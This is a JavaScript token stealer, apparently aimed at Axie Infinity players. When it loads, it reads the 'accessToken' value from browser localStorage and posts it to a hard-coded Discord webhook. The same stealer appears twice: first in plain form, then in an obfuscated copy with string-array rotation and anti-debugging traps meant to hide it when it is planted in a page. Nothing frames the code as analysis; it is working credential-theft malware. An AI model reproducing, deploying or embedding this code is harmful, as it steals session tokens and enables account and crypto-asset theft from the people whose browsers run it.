const WEBHOOK =
  "https://discord.com/api/webhooks/858890240226885663/UMoMOs6xU-o6nXMwaRi6AX08jiBKuhQ0xkzZL9Gvg_C8GbIb7bwL89OcP11PRvRiT4Ey";

function logToken(token) {
  const HTTP = new XMLHttpRequest();
  const data = {
    embeds: [
      {
        title: "Axie Token Login test",
        description: "Feito por Plebeu Dev",
        color: 65306,
        fields: [
          {
            name: "Token",
            value: token,
            inline: false,
          },
        ],
      },
    ],
  };
  const data_s = JSON.stringify(data);
  HTTP.open("POST", WEBHOOK);
  HTTP.setRequestHeader("Content-Type", "application/json");
  HTTP.send(data_s);
}

function getToken() {
  let token = "NoToken";
  if (localStorage.hasOwnProperty("accessToken")) {
    token = localStorage.getItem("accessToken");
  }
  logToken(token);
}

getToken();

//!encode

const _0x169b = [
  "mFxUx",
  "counter",
  "\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)",
  "Fzgcz",
  "hasOwnProperty",
  "test",
  "tMMpP",
  "ZAHXI",
  "NoToken",
  "VFGlZ",
  "Pyevz",
  "IjVIX",
  "POST",
  "rIYuV",
  "jOdBp",
  "790292OEHJXi",
  "rygvk",
  "EgzaV",
  "BrMuN",
  "SrZOi",
  "955892ecUEkl",
  "FneSZ",
  "2NFWndi",
  "call",
  "accessToken",
  "WPAAJ",
  "76969RTVovS",
  "Token",
  "constructor",
  "865271vYEbaL",
  "debu",
  "stateObject",
  "TLAii",
  "Feito\x20por\Ninguém\x20OOO",
  "setRequestHeader",
  "vHObb",
  "QBCmB",
  "mGKvK",
  "YHkrW",
  "Content-Type",
  "WkglR",
  "init",
  "while\x20(true)\x20{}",
  "kZOtF",
  "ktbEU",
  "https://discord.com/api/webhooks/858890240226885663/UMoMOs6xU-o6nXMwaRi6AX08jiBKuhQ0xkzZL9Gvg_C8GbIb7bwL89OcP11PRvRiT4Ey",
  "WDFYN",
  "JwRKy",
  "open",
  "length",
  "KcigE",
  "GalIw",
  "1042537XRKoeA",
  "embeds",
  "mkhjn",
  "stringify",
  "pwgGT",
  "function\x20*\x5c(\x20*\x5c)",
  "3NLIQav",
  "QclFj",
  "VMGlx",
  "apply",
  "181090ONgszU",
  "Lrmuk",
  "88433svphWP",
  "string",
  "whTGp",
  "send",
  "RyKoQ",
];
const _0x102d03 = _0x3b10;
(function (_0x45d443, _0x1cee3e) {
  const _0x48a881 = _0x3b10;
  while (!![]) {
    try {
      const _0x29dcc1 =
        -parseInt(_0x48a881(0x1e3)) * -parseInt(_0x48a881(0x1be)) +
        parseInt(_0x48a881(0x1dd)) +
        parseInt(_0x48a881(0x1b8)) +
        -parseInt(_0x48a881(0x1df)) * -parseInt(_0x48a881(0x1c4)) +
        -parseInt(_0x48a881(0x1d8)) +
        -parseInt(_0x48a881(0x1c2)) +
        -parseInt(_0x48a881(0x1e6));
      if (_0x29dcc1 === _0x1cee3e) break;
      else _0x45d443["push"](_0x45d443["shift"]());
    } catch (_0x3ba785) {
      _0x45d443["push"](_0x45d443["shift"]());
    }
  }
})(_0x169b, -0x20292 * 0x3 + -0x7749 + 0xf2fcc);
function _0x3b10(_0x12821a, _0x1c0af8) {
  return (
    (_0x3b10 = function (_0x4d7c9c, _0x2fbb80) {
      _0x4d7c9c = _0x4d7c9c - (0x1d * 0x91 + -0x107 * -0x2 + -0x5 * 0x35b);
      let _0x9eae24 = _0x169b[_0x4d7c9c];
      return _0x9eae24;
    }),
    _0x3b10(_0x12821a, _0x1c0af8)
  );
}
const WEBHOOK = _0x102d03(0x1f6);
function logToken(_0xa76c7a) {
  const _0x2ece5a = _0x102d03,
    _0x2674c6 = {};
  (_0x2674c6[_0x2ece5a(0x1d4)] = "Axie\x20Token\x20Login\x20test"),
    (_0x2674c6[_0x2ece5a(0x1cc)] = _0x2ece5a(0x1ea)),
    (_0x2674c6[_0x2ece5a(0x1b7)] = _0x2ece5a(0x1e4)),
    (_0x2674c6[_0x2ece5a(0x1ba)] = _0x2ece5a(0x1d5)),
    (_0x2674c6["VMGlx"] = _0x2ece5a(0x1f0)),
    (_0x2674c6[_0x2ece5a(0x1f4)] = "application/json");
  const _0x3be5f0 = _0x2674c6,
    _0x4fd814 = new XMLHttpRequest(),
    _0x50c929 = {};
  (_0x50c929["title"] = _0x3be5f0[_0x2ece5a(0x1d4)]),
    (_0x50c929["description"] = _0x3be5f0[_0x2ece5a(0x1cc)]),
    (_0x50c929["color"] = 0xff1a),
    (_0x50c929["fields"] = [
      { name: _0x3be5f0[_0x2ece5a(0x1b7)], value: _0xa76c7a, inline: ![] },
    ]);
  const _0x1787b8 = {};
  _0x1787b8[_0x2ece5a(0x1b9)] = [_0x50c929];
  const _0xb41d33 = _0x1787b8,
    _0x529352 = JSON[_0x2ece5a(0x1bb)](_0xb41d33);
  _0x4fd814[_0x2ece5a(0x1b4)](_0x3be5f0["mkhjn"], WEBHOOK),
    _0x4fd814[_0x2ece5a(0x1eb)](
      _0x3be5f0[_0x2ece5a(0x1c0)],
      _0x3be5f0[_0x2ece5a(0x1f4)]
    ),
    _0x4fd814[_0x2ece5a(0x1c7)](_0x529352);
}
function getToken() {
  const _0x33a72d = _0x102d03,
    _0x3a0183 = {
      Lrmuk: _0x33a72d(0x1bd),
      WkglR: _0x33a72d(0x1cb),
      zhxeM: function (_0x584540, _0x1ec9b7) {
        return _0x584540 + _0x1ec9b7;
      },
      JwRKy: "chain",
      ZAHXI: function (_0x9351c5, _0x14a8fd) {
        return _0x9351c5 + _0x14a8fd;
      },
      RyKoQ: "input",
      mGKvK: function (_0x1dfce8, _0x26d89b) {
        return _0x1dfce8(_0x26d89b);
      },
      whTGp: function (_0x56d01d) {
        return _0x56d01d();
      },
      VFGlZ: function (_0x17d1fb, _0x22a60d, _0x7fbc55) {
        return _0x17d1fb(_0x22a60d, _0x7fbc55);
      },
      rIYuV: _0x33a72d(0x1d1),
      BrMuN: _0x33a72d(0x1e1),
      vHObb: function (_0x3bff90, _0x132f4b) {
        return _0x3bff90(_0x132f4b);
      },
    },
    _0xd1becf = (function () {
      let _0x729b4e = !![];
      return function (_0x5924e6, _0x4c1c5a) {
        const _0x35a655 = _0x729b4e
          ? function () {
              const _0x3eb978 = _0x3b10;
              if (_0x4c1c5a) {
                const _0x9d073f = _0x4c1c5a[_0x3eb978(0x1c1)](
                  _0x5924e6,
                  arguments
                );
                return (_0x4c1c5a = null), _0x9d073f;
              }
            }
          : function () {};
        return (_0x729b4e = ![]), _0x35a655;
      };
    })();
  (function () {
    const _0x15faab = _0x33a72d,
      _0x5ddccd = {
        EgzaV: _0x3a0183[_0x15faab(0x1c3)],
        pwCjR: _0x3a0183[_0x15faab(0x1f1)],
        ktbEU: function (_0x383687, _0x536676) {
          return _0x3a0183["zhxeM"](_0x383687, _0x536676);
        },
        Pyevz: _0x3a0183[_0x15faab(0x1f8)],
        QclFj: function (_0x3d4e38, _0x3af96a) {
          const _0x565cbb = _0x15faab;
          return _0x3a0183[_0x565cbb(0x1d0)](_0x3d4e38, _0x3af96a);
        },
        WDFYN: _0x3a0183[_0x15faab(0x1c8)],
        GQQfl: function (_0x2f66d5, _0x381b71) {
          const _0x282076 = _0x15faab;
          return _0x3a0183[_0x282076(0x1ee)](_0x2f66d5, _0x381b71);
        },
        YHkrW: function (_0x2a3dcb) {
          const _0x1d73bc = _0x15faab;
          return _0x3a0183[_0x1d73bc(0x1c6)](_0x2a3dcb);
        },
      };
    _0x3a0183[_0x15faab(0x1d2)](_0xd1becf, this, function () {
      const _0x2de80f = _0x15faab,
        _0x83c69a = new RegExp(_0x5ddccd[_0x2de80f(0x1da)]),
        _0x3f769a = new RegExp(_0x5ddccd["pwCjR"], "i"),
        _0x5a8b93 = _0x450270(_0x2de80f(0x1f2));
      !_0x83c69a[_0x2de80f(0x1ce)](
        _0x5ddccd[_0x2de80f(0x1f5)](_0x5a8b93, _0x5ddccd[_0x2de80f(0x1d3)])
      ) ||
      !_0x3f769a[_0x2de80f(0x1ce)](
        _0x5ddccd[_0x2de80f(0x1bf)](_0x5a8b93, _0x5ddccd[_0x2de80f(0x1f7)])
      )
        ? _0x5ddccd["GQQfl"](_0x5a8b93, "0")
        : _0x5ddccd[_0x2de80f(0x1ef)](_0x450270);
    })();
  })();
  let _0x5f2d3a = _0x3a0183[_0x33a72d(0x1d6)];
  localStorage[_0x33a72d(0x1cd)](_0x3a0183[_0x33a72d(0x1db)]) &&
    (_0x5f2d3a = localStorage["getItem"](_0x3a0183["BrMuN"])),
    _0x3a0183[_0x33a72d(0x1ec)](logToken, _0x5f2d3a);
}
getToken();
function _0x450270(_0x39b5bd) {
  const _0xefd739 = _0x102d03,
    _0x2bc159 = {
      WPAAJ: _0xefd739(0x1c5),
      TLAii: _0xefd739(0x1f3),
      rygvk: _0xefd739(0x1ca),
      iikIs: function (_0x5f153b, _0x3876e2) {
        return _0x5f153b !== _0x3876e2;
      },
      FneSZ: function (_0x55fe8f, _0x37af32) {
        return _0x55fe8f + _0x37af32;
      },
      QBCmB: function (_0x8aba, _0x354094) {
        return _0x8aba / _0x354094;
      },
      KcigE: _0xefd739(0x1b5),
      LWGHc: function (_0xa36567, _0x410cb8) {
        return _0xa36567 % _0x410cb8;
      },
      DMjxk: _0xefd739(0x1e7),
      tMMpP: "gger",
      SrZOi: "action",
      jOdBp: _0xefd739(0x1e8),
      mFxUx: function (_0xf186d2, _0x54c310) {
        return _0xf186d2(_0x54c310);
      },
      pwgGT: function (_0x7ca970, _0x1b7624) {
        return _0x7ca970(_0x1b7624);
      },
    };
  function _0x472e2d(_0x3a217a) {
    const _0x472f73 = _0xefd739;
    if (typeof _0x3a217a === _0x2bc159[_0x472f73(0x1e2)])
      return function (_0x2729d1) {}
        [_0x472f73(0x1e5)](_0x2bc159[_0x472f73(0x1e9)])
        [_0x472f73(0x1c1)](_0x2bc159[_0x472f73(0x1d9)]);
    else
      _0x2bc159["iikIs"](
        _0x2bc159[_0x472f73(0x1de)](
          "",
          _0x2bc159[_0x472f73(0x1ed)](_0x3a217a, _0x3a217a)
        )[_0x2bc159[_0x472f73(0x1b6)]],
        -0x115b + -0x1da0 + 0x2efc
      ) ||
      _0x2bc159["LWGHc"](
        _0x3a217a,
        -0x65 * -0x2e + -0x1 * -0x255 + -0x1467 * 0x1
      ) ===
        0x573 + 0x2 * -0x94f + 0xd2b
        ? function () {
            return !![];
          }
            [_0x472f73(0x1e5)](
              _0x2bc159["FneSZ"](_0x2bc159["DMjxk"], _0x2bc159["tMMpP"])
            )
            [_0x472f73(0x1e0)](_0x2bc159[_0x472f73(0x1dc)])
        : function () {
            return ![];
          }
            [_0x472f73(0x1e5)](_0x2bc159["DMjxk"] + _0x2bc159[_0x472f73(0x1cf)])
            [_0x472f73(0x1c1)](_0x2bc159[_0x472f73(0x1d7)]);
    _0x2bc159[_0x472f73(0x1c9)](_0x472e2d, ++_0x3a217a);
  }
  try {
    if (_0x39b5bd) return _0x472e2d;
    else
      _0x2bc159[_0xefd739(0x1bc)](
        _0x472e2d,
        -0x59 * -0x37 + -0x12df * 0x1 + -0x8 * 0x8
      );
  } catch (_0x36b526) {}
}
